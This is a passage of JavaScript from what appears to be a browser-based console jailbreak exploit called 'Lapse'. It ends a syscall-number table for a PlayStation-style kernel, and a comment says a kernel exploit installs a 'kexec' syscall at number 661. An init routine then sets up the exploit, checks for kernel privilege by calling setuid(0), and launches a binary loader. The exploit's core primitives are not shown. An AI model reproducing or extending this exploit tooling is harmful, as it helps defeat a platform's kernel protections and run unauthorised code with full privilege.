    'socket': 97,
    'connect': 98,
    'bind': 104,
    'setsockopt': 105,
    'listen': 106,
    'getsockopt': 118,
    'fchmod': 124,
    'socketpair': 135,
    'fstat': 189,
    'getdirentries': 196,
    '__sysctl': 202,
    'mlock': 203,
    'munlock': 204,
    'clock_gettime': 232,
    'nanosleep': 240,
    'sched_yield': 331,
    'kqueue': 362,
    'kevent': 363,
    'rtprio_thread': 466,
    'mmap': 477,
    'ftruncate': 480,
    'shm_open': 482,
    'cpuset_getaffinity': 487,
    'cpuset_setaffinity': 488,
    'jitshm_create': 533,
    'jitshm_alias': 534,
    'evf_create': 538,
    'evf_delete': 539,
    'evf_set': 544,
    'evf_clear': 545,
    'set_vm_container': 559,
    'dmem_container': 586,
    'dynlib_dlsym': 591,
    'dynlib_get_list': 592,
    'dynlib_get_info': 593,
    'dynlib_load_prx': 594,
    'randomized_path': 602,
    'budget_get_ptype': 610,
    'thr_suspend_ucontext': 632,
    'thr_resume_ucontext': 633,
    'blockpool_open': 653,
    'blockpool_map': 654,
    'blockpool_unmap': 655,
    'blockpool_batch': 657,
    // syscall 661 is unimplemented so free for use. a kernel exploit will
    // install "kexec" here
    'aio_submit': 661,
    'kexec': 661,
    'aio_multi_delete': 662,
    'aio_multi_wait': 663,
    'aio_multi_poll': 664,
    'aio_multi_cancel': 666,
    'aio_submit_cmd': 669,
    'blockpool_move': 673
  }));
  return 1;
}
//================================================================================================
// Lapse Init Function ===========================================================================
//================================================================================================
async function doLapseInit() {
  try {
    var init_status;
    init_status = Init_LapseGlobals();
    if (init_status !== 1) {
      window.log("Global variables not properly initialized. Please refresh page and try again...", "red");
      return 0;
    }
    await lapse_init();
  } catch (error) {
    window.log("An error occured during Lapse initialization\nPlease refresh page and try again...\nError definition: " + error, "red");
    return 0;
  }
  try {
    // Check if jailbreak already done before
    if (sysi("setuid", 0) == 0) {
      window.log("\nAlready jailbroken, no need to re-jailbrake", "green");
      runBinLoader();
      return 0;
    }
  }
  catch (error) {
    //window.log("\nAn error occured during if jailbroken test: " + error, "red");
  }
  return 1;
}
//================================================================================================
window.script_loaded = 1;
